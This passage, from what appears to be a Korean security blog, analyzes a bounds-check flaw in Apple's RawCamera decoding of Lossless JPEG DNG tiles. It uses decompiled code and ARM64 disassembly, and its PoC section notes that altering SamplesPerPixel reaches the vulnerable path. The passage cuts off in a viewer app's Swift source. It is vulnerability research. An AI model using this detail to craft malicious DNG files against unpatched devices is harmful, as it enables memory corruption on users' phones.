&#xD7; W &#xD7; H&#x2018; &#xC774;&#xB807;&#xAC8C; &#xB450; &#xAC00;&#xC9C0; &#xBFD0;&#xC774;&#xC5C8;&#xACE0;, &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xD589; &#xB2E8;&#xC704; &#xC624;&#xD504;&#xC14B;(<code>BytesPerRow</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xC774;&#xBBF8;&#xC9C0;(&#xC0C9;&#xACF5;&#xAC04;&#xB7;&#xC11C;&#xBE0C;&#xC0D8;&#xD50C;&#xB9C1;&#xB7;&#xD589; &#xD328;&#xB529; &#xB4F1;) <strong>&#xAC80;&#xC99D;&#xC740; &#xD1B5;&#xACFC;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C; &#xC811;&#xADFC;&#xC740; CFData &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB0A0; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</strong> </p><p>&#xC774;&#xB7EC;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xD328;&#xCE58;&#xD55C; G100(18.6.2)&#xC5D0;&#xC11C;&#xB294; &#xB514;&#xCF54;&#xB529;&#xC744; CMPhoto(+ JFIF &#xD55C;&#xC815;) &#x2192; CVPixelBuffer&#xB85C; &#xC804;&#xD658;&#xD558;&#xC600;&#xACE0;, &#xC2E4;&#xC81C; &#xBC84;&#xD37C; &#xCD1D; &#xBC14;&#xC774;&#xD2B8; &#xC218;(<code>CVPixelBufferGetDataSize</code>)&#xB97C; &#xB0B4;&#xBD80; &#xD5EC;&#xD37C;&#xAC00; &#xACC4;&#xC0B0;&#xD55C; &#xAE30;&#xB300; &#xD06C;&#xAE30;(&#xD3ED;&#xB7;&#xB192;&#xC774; &#xB4F1;)&#xC640; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. </p><hr><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>(G90 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.)</p><p>&#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xC911;&#xC5D0; <code>sub_1DD8A7684</code> &#xAC00; vtable&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>C++ &#xAC1D;&#xCCB4;&#xB294; &#xCCAB; &#xD544;&#xB4DC;&#xAC00; &#xBCF4;&#xD1B5; vptr(vtable &#xD3EC;&#xC778;&#xD130;)&#xC774;&#xACE0;, &#xAC00;&#xC0C1;&#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; this-&gt;vptr[slot]&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; RawCamera &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; strip &#xB418;&#xC5B4; &#xC2EC;&#xBCFC;&#xC774; &#xC9C0;&#xC6CC;&#xC838;&#xC788;&#xC5B4;&#xC11C; &#xC8FC;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xAE30;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xAC00; &#xC27D;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp">[ex](*(*<span class="hljs-keyword">this</span>)+<span class="hljs-number">0xE0</span>)(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><pre><code class="hljs cpp">[ex]<span class="hljs-keyword">this</span>-&gt;vptr-&gt;unpack_lossless(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>&#xADF8;&#xB798;&#xC11C; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C;, &#xC5B4;&#xB5A4; &#xC778;&#xC790;&#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xC9C0; &#xB4F1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC704;&#xCC98;&#xB7FC; vtable&#xC744; &#xAD6C;&#xC870;&#xCCB4;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xBA3C;&#xC800; &#xC9C4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.  </p><p>IDAPython&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>vtable &#xD30C;&#xC2F1; &#xD6C4; &#xAD6C;&#xC870;&#xCCB4;&#xD654;</li><li>&#xBAA8;&#xB4E0; &#xAC00;&#xC0C1; &#xD568;&#xC218;&#xC5D0; &#xCCAB; &#xC778;&#xC790; <code>struct CDNGLosslessJpegUnpacker *this</code> &#xC801;&#xC6A9; (this&#xB97C; &#xD074;&#xB798;&#xC2A4; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xD0C0;&#xC785;&#xD654;)</li></ol><p>&#xC774;&#xB807;&#xAC8C; &#xC801;&#xC6A9;&#xD558;&#xBA74; <code>(*(*this)+0xE0)(this)</code> &#xAC00; <code>this-&gt;vptr-&gt;fn_028(this, &#x2026;)</code> &#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xACE0;, &#xD544;&#xB4DC; &#xC811;&#xADFC;&#xB3C4; <code>this-&gt;field_d8</code>&#xCC98;&#xB7FC; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC2AC;&#xB86F; &#xB9E4;&#xD551;&#xACFC; &#xCD94;&#xC801;&#xC774; &#xC26C;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC9C0; &#xCF5C;&#xD2B8;&#xB9AC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image14.png" alt="image.png"></p><p>&#xBA3C;&#xC800; Lossless&#xB97C; &#xD544;&#xD130;&#xB9C1; &#xAC78;&#xC5B4;, &#xCDE8;&#xC57D;&#xD558;&#xB2E4;&#xACE0; &#xACF5;&#xAC1C;&#xB41C; <code>CDNGLosslessJpegUnpacker</code> &#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA74; <code>sub_1DD95DE88</code> &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC0C1;&#xC138; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD95DE88</span><span class="hljs-params">(<span class="hljs-keyword">os_signpost_id_t</span> a1, __int64 a2, __int64 a3, __int64 a4)</span></span><span class="hljs-function"></span>{  .  .  .    <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">216</span>)    || (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">os_signpost_id_t</span>))(*(_QWORD *)a1 + <span class="hljs-number">224L</span>L))(a1) == <span class="hljs-number">2</span>    || (v12 = *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>), v12 == <span class="hljs-number">4</span>) )  {    sub_1DD9009D4(a1, a2, a3, a4);  }  <span class="hljs-keyword">else</span>  {    v14 = *(_DWORD *)(a1 + <span class="hljs-number">44</span>);    v13 = *(_DWORD *)(a1 + <span class="hljs-number">48</span>);    v15 = *(_DWORD *)(a1 + <span class="hljs-number">224</span>);    v16 = *(_DWORD *)(a1 + <span class="hljs-number">228</span>);    *(_QWORD *)&amp;v35 = v12 &gt;&gt; <span class="hljs-number">2</span>;    sub_1DD8731E0(&amp;v36, &amp;v35);    <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>) != *(_QWORD *)(a1 + <span class="hljs-number">264</span>) - *(_QWORD *)(a1 + <span class="hljs-number">256</span>)      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v14 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v13 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || v15 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || v16 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || (v28 = v11, v17 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v36, v36 &gt;= <span class="hljs-number">20000</span>) )    {      exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(exception_15, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    v29 = a4;    <span class="hljs-keyword">if</span> ( (((v13 + v16 - <span class="hljs-number">1</span>) / v16) &gt;&gt; (*(_DWORD *)(a1 + <span class="hljs-number">216</span>) != <span class="hljs-number">0</span>)) * ((v14 + v15 - <span class="hljs-number">1</span>) / v15) != v36 )    {      v27 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v27, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(v27, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    group = dispatch_group_create();    v30 = dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, MEMORY[<span class="hljs-number">0x1E6FA52F0</span>]);</code></pre><p><code>sub_1DD95DE88</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; 3&#xAC00;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. </p><ul><li><p>[this+0xD8] != 0</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF30</span>  LDR   W8, [X23,#<span class="hljs-number">0xD8</span>]<span class="hljs-number">0x1DD95DF34</span>  CBNZ  W8, loc_1DD95DF78</code></pre><p>  &#x2192; 0&#xC774; &#xC544;&#xB2C8;&#xBA74; &#xBC14;&#xB85C; <code>loc_1DD95DF78</code> &#xACBD;&#xB85C;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;.</p></li><li><p>vtable &#xC624;&#xD504;&#xC14B; 0xE0(&#xC2AC;&#xB86F; &#xC778;&#xB371;&#xC2A4; 28) &#xD638;&#xCD9C; &#xACB0;&#xACFC;&#xAC00; 2&#xC778;&#xC9C0; &#xBE44;&#xAD50;</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF38</span>  LDR   X16, [X23]           ; vtable = [<span class="hljs-keyword">this</span>]<span class="hljs-number">0x1DD95DF44</span>  AUTDA X16, X17             ; (PAC &#xD574;&#xC81C;)<span class="hljs-number">0x1DD95DF48</span>  LDR   X8,  [X16,#<span class="hljs-number">0xE0</span>]!    ; fn = vtable[<span class="hljs-number">0xE0</span>/<span class="hljs-number">8</span>] &#x2190; &#xC2AC;&#xB86F; <span class="hljs-number">28</span><span class="hljs-number">0x1DD95DF50</span>  MOV   X0,  X23             ; <span class="hljs-keyword">this</span><span class="hljs-number">0x1DD95DF5C</span>  BLRAA X8, X17              ; &#xAC04;&#xC811; &#xD638;&#xCD9C;<span class="hljs-number">0x1DD95DF60</span>  CMP   W0,  #<span class="hljs-number">2</span>              ; &#xBC18;&#xD658;&#xAC12; == <span class="hljs-number">2</span> ?<span class="hljs-number">0x1DD95DF64</span>  B.EQ  loc_1DD95DF78</code></pre><p>  &#x2192; &#xBC18;&#xD658;&#xAC12;&#xC774; 2&#xBA74; <code>loc_1DD95DF78</code>&#xB85C; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>([this+0xF0] - [this+0xE8]) == 4 &#xCCB4;&#xD06C;</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF68</span>  LDP   X9, X8, [X23,#<span class="hljs-number">0xE8</span>]  ; X9=[E8], X8=[F0]<span class="hljs-number">0x1DD95DF6C</span>  SUB   X8, X8, X9           ; (F0 - E8)<span class="hljs-number">0x1DD95DF70</span>  CMP   X8, #<span class="hljs-number">4</span><span class="hljs-number">0x1DD95DF74</span>  B.NE  loc_1DD95E008</code></pre><p>  &#x2192; &#xCC28;&#xC774;&#xAC00; 4&#xAC00; &#xC544;&#xB2C8;&#xBA74; loc_1DD95E008 &#xACBD;&#xB85C;&#xB85C; &#xBE60;&#xC9C0;&#xACE0;, 4&#xC774;&#xBA74; &#xC704;&#xC758; &#xBD84;&#xAE30;&#xB4E4;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xD1B5;&#xACFC;&#xD558;&#xC5EC; loc_1DD95DF78 &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p></li></ul><pre><code class="hljs angelscript"><span class="hljs-comment">// sub_1DD95DE88</span><span class="hljs-keyword">if</span> ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xD8</span>] != <span class="hljs-number">0</span>               <span class="hljs-comment">// 0xD8 &#xD50C;&#xB798;&#xADF8;</span> || vtable[<span class="hljs-number">28</span>](<span class="hljs-keyword">this</span>) == <span class="hljs-number">2</span>          <span class="hljs-comment">// &#xC2AC;&#xB86F; 28 &#xD638;&#xCD9C; &#xBC18;&#xD658;&#xAC12;</span> || ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xF0</span>]-[<span class="hljs-keyword">this</span>+<span class="hljs-number">0xE8</span>]) == <span class="hljs-number">4</span> <span class="hljs-comment">// &#xAE38;&#xC774;/&#xC624;&#xD504;&#xC14B; &#xC77C;&#xCE58;</span>) {    <span class="hljs-comment">// &#xD0C0;&#xC77C; &#xD050; &#xC548; &#xD0D0; (&#xCDE8;&#xC57D; &#xACBD;&#xB85C; &#xC544;&#xB2D8;)</span>    sub_1DD9009D4(...);} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// &#xD0C0;&#xC77C; &#xD050; &#xACBD;&#xB85C; &#x2192; &#xCDE8;&#xC57D; &#xACBD;&#xB85C;&#xB85C; &#xC9C4;&#xC785; &#xAC00;&#xB2A5;</span>    dispatch_group_create();    dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, ...);    <span class="hljs-comment">// &#xAC01; &#xD0C0;&#xC77C; &#xC791;&#xC5C5; &#xBE14;&#xB85D; &#xB0B4;&#xBD80;:</span>    sub_1DD95E410 &#x2192; sub_1DD95DCD8 &#x2192; (HW) sub_1DD95E4A4 &#xB610;&#xB294; (SW) sub_1DD95B198    <span class="hljs-comment">// &#xCD5C;&#xC885; &#xD53D;&#xC140; &#xBCC0;&#xD658;:</span>    &#x2264;<span class="hljs-number">8</span>bpp: sub_1DD95EF54 &#x2192; LUT &#xAC8C;&#xC774;&#xD2B8; sub_1DDA4EF58    &#x2265;<span class="hljs-number">9</span>bpp: sub_1DD95EA64 &#x2192; LUT &#xAC8C;&#xC774;&#xD2B8; sub_1DDA4EF58}</code></pre><p>&#xC774; &#xC870;&#xAC74;&#xC774; &#xC131;&#xB9BD;&#xD558;&#xB294; &#xBD84;&#xAE30;&#xC5D0;&#xC11C; &#x201C;Lossless DNG Tile Unpacker Queue&#x201D;&#xB77C;&#xB294; &#xD0C0;&#xC77C; &#xB2E8;&#xC704; &#xD574;&#xC81C; &#xD050;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xACE0;, &#xADF8; &#xD558;&#xC704; &#xACBD;&#xB85C;&#xAC00; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><hr><p>&#xC774;&#xB54C; &#xD0C0;&#xC77C; &#xD050;&#xB294; &#xD55C; &#xC7A5;&#xC9DC;&#xB9AC; &#xD070; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; TileWidth &#xD7; TileLength &#xD06C;&#xAE30;&#xC758; &#xC791;&#xC740; &#xC870;&#xAC01;&#xC73C;&#xB85C; &#xCABC;&#xAC1C;&#xC11C;, &#xD0C0;&#xC77C;&#xBCC4;&#xB85C; &#xB514;&#xCF54;&#xB4DC; &#x2192; &#xC0C9;&#xBCF4;&#xC815; &#x2192; &#xCD9C;&#xB825; &#xBC84;&#xD37C; &#xBC30;&#xCE58; &#xB4F1;&#xC758; &#xACFC;&#xC815;&#xC744; &#xC218;&#xD589;&#xD55C;&#xB2E4;&#xACE0; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c"><span class="hljs-number">0x1DD95DE88</span>    <span class="hljs-number">0x1DD95E410</span>        <span class="hljs-number">0x1DD95DCD8</span>            <span class="hljs-number">0x1DD95E4A4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95B198</span>                <span class="hljs-number">0x1DD95EF54</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95EA64</span>                    <span class="hljs-number">0x1DDA4EF58</span></code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xCF5C;&#xD2B8;&#xB9AC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC774; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><hr><p><img src="/2025/10/23/clalxk/imageIO_ko/image15.png" alt="image.png"></p><p>Boom..</p><p>&#xC0C8;&#xB85C;&#xC6B4; &#xBA38;&#xB9AC;&#xB85C; &#xB2E4;&#xC2DC; &#xAC00;&#xBCF4;&#xC8E0;.. &gt;&lt;</p><hr><p>&#xC704;&#xC5D0;&#xC11C; &#xC774;&#xBBF8;&#xC9C0;&#xB098; DNG &#xB4F1;&#xC744; &#xC5EC;&#xB7EC;&#xBC88; &#xC5B8;&#xAE09;&#xD588;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB824;&#xBA74; &#xBC30;&#xACBD; &#xAC1C;&#xB150;&#xC774; &#xD544;&#xC694;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD788; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>&#xC774;&#xBBF8;&#xC9C0; &#xAD00;&#xB828; (&#xD53D;&#xC140; / &#xCC44;&#xB110;(=&#xC0D8;&#xD50C;) / &#xBE44;&#xD2B8; &#xAE4A;&#xC774;)</strong></p><ul><li><strong>&#xD53D;&#xC140;</strong>: &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xCD5C;&#xC18C; &#xB2E8;&#xC704;.</li><li><p><strong>&#xCC44;&#xB110;(&#xC0D8;&#xD50C;)</strong>: &#xD53D;&#xC140;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xC218;&#xCE58; &#xC131;&#xBD84; 1&#xAC1C;(R, G, B &#xB4F1;).</p><p>  &#x2192; SamplesPerPixel = &#xD53D;&#xC140;&#xB2F9; &#xCC44;&#xB110; &#xC218;</p><p>  &#x2192; BitsPerSample = &#xCC44;&#xB110; &#xD558;&#xB098;&#xB97C; &#xBA87; &#xBE44;&#xD2B8;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xB294;&#xC9C0;(&#xC815;&#xBC00;&#xB3C4;)</p></li><li><p>&#xC608;&#xC2DC;</p><ul><li>Grayscale: SamplesPerPixel=1, BitsPerSample=8 &#x2192; &#xD53D;&#xC140;&#xB2F9; 1&#xBC14;&#xC774;&#xD2B8;</li><li>RGB 8bpc: SamplesPerPixel=3, BitsPerSample=8 &#x2192; &#xD53D;&#xC140;&#xB2F9; 3&#xBC14;&#xC774;&#xD2B8;</li><li>RGBA 16bpc: SamplesPerPixel=4, BitsPerSample=16 &#x2192; &#xD53D;&#xC140;&#xB2F9; 8&#xBC14;&#xC774;&#xD2B8;</li></ul><p>&#x2192; <strong>&#xC774; &#xBA54;&#xD0C0;&#xAC12;&#xB4E4;&#xB85C; &#xBC84;&#xD37C; &#xD06C;&#xAE30;/stride/&#xB8E8;&#xD504; &#xACBD;&#xACC4;</strong>&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul></li><li><p><strong>DNG</strong> </p><ul><li><strong>Adobe&#xAC00; &#xB9CC;&#xB4E0; RAW &#xC774;&#xBBF8;&#xC9C0; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xD3EC;&#xB9F7;&#xC785;&#xB2C8;&#xB2E4;</strong>. &#xB0B4;&#xBD80;&#xB294; &#xC0AC;&#xC2E4;&#xC0C1; <strong>TIFF/EP &#xAE30;&#xBC18;</strong>&#xC774;&#xB77C; &#xD0DC;&#xADF8;(&#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;)&#xB85C; &#xAD6C;&#xC870;&#xAC00; &#xD45C;&#xD604;&#xB418;&#xACE0;, &#xCE74;&#xBA54;&#xB77C; &#xC13C;&#xC11C;&#xAC00; &#xBC49;&#xC740; &#xAC00;&#xACF5; &#xC804; &#xC6D0;&#xC2DC; &#xB370;&#xC774;&#xD130;(&#xBCA0;&#xC774;&#xC5B4;/CFA &#xB4F1;)&#xC640; &#xC378;&#xB124;&#xC77C;, &#xC0C9; &#xBCF4;&#xC815; &#xC815;&#xBCF4; &#xB4F1;&#xC744; &#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xB2F4;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB370;&#xC774;&#xD130; &#xB2E8;&#xC704;: <strong>Strips, Tiles</strong></li><li>&#xAD00;&#xB828; &#xD575;&#xC2EC; &#xD0DC;&#xADF8;<ul><li>&#xD06C;&#xAE30; &#xACC4;&#xC5F4;: RowsPerStrip &#xB610;&#xB294; TileWidth/TileLength</li><li>&#xC704;&#xCE58;/&#xD06C;&#xAE30;: StripOffsets/TileOffsets, StripByteCounts/TileByteCounts</li><li>&#xD53D;&#xC140; &#xD3EC;&#xB9F7;: SamplesPerPixel, BitsPerSample, (&#xD544;&#xC694; &#xC2DC; PlanarConfiguration &#xB4F1;)</li></ul></li></ul></li></ol><p><strong>&#x2192;</strong> Offsets/ByteCounts&#xB97C; &#xC77D;&#xACE0;, BytesPerRow(stride) &#xACC4;&#xC0B0;&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB514;&#xC5D0; &#xC5BC;&#xB9C8;&#xB098; &#xC4F8;&#xC9C0;&#xB97C; &#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>RAW / &#xC555;&#xCD95;</strong></p><ul><li><p>RAW&#xB294; &#xCE74;&#xBA54;&#xB77C; &#xC13C;&#xC11C;&#xC5D0;&#xC11C; &#xB098;&#xC628; &#xAC00;&#xACF5; &#xC804; &#xB370;&#xC774;&#xD130;&#xB77C; &#xBCF4;&#xD1B5; 12/14/16bpp &#xAC19;&#xC740; &#xB192;&#xC740; &#xBE44;&#xD2B8; &#xC2EC;&#xB3C4;(&#xB300;&#xAC1C; CFA &#xBCA0;&#xC774;&#xC5B4;&#xB77C; &#xD53D;&#xC140;&#xB2F9; 1 &#xC0D8;&#xD50C;)&#xB97C; &#xAC16;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC6A9;&#xB7C9;&#xC774; &#xD07D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; DNG&#xB294; &#xBE44;&#xC555;&#xCD95;&#xB3C4; &#xD5C8;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB860; &#xBB34;&#xC190;&#xC2E4; &#xC555;&#xCD95;(&#xC608;: Lossless JPEG, Deflate)&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Compression=1 &#x2192; &#xBE44;&#xC555;&#xCD95;</li><li><strong>Compression=7 &#x2192; JPEG (Baseline DCT &#xB610;&#xB294; Lossless JPEG(SOF3))</strong></li><li>Compression=8 &#x2192; Deflate/ZIP</li><li>Compression=34892 &#x2192; Baseline DCT JPEG (lossy)</li></ul><p>&#x2192; &#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>Lossless JPEG(SOF3)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;</strong>&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul></li></ol><hr><h2 id="1-3-PoC"><a href="#1-3-PoC" class="headerlink" title="1.3 PoC"></a>1.3 PoC</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image16.png" alt="image.png"></p><p>&#xBCF4;&#xD1B5;&#xC758; DNG &#xD30C;&#xC77C;&#xB85C;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBA54;&#xD0C0; &#xD0DC;&#xADF8;(SamplesPerPixel) &#xC870;&#xC815; &#xB4F1;&#xC73C;&#xB85C; &#xADF8; &#xAC80;&#xC99D; &#xAD6C;&#xAC04;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xBA74;, &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC81C; &#xD578;&#xB4DC;&#xD3F0;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;&#xB97C; &#xC704;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC548;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; (= &#xC6A9;&#xB7C9;&#xC5C6;&#xC74C;) </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image17.png" alt="image.png"></p><p>&#xC81C; &#xBC84;&#xC804;&#xC740; 18.1.1 &#xC785;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image18.png" alt="image.png"></p><p>&#xC6B0;&#xC120; DNG &#xD30C;&#xC77C;&#xC744; &#xC5F4; DNGViewer&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAD6C;&#xD604;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">import</span> SwiftUI<span class="hljs-keyword">import</span> UniformTypeIdentifiers<span class="hljs-keyword">import</span> Combine<span class="hljs-keyword">import</span> UIKit<span class="hljs-keyword">import</span> CoreImage<span class="hljs-keyword">import</span> CoreImage.CIFilterBuiltins@main<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNGViewerApp</span>:</span> App {    var body: some Scene {        WindowGroup {            ContentView()        }    }}<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span 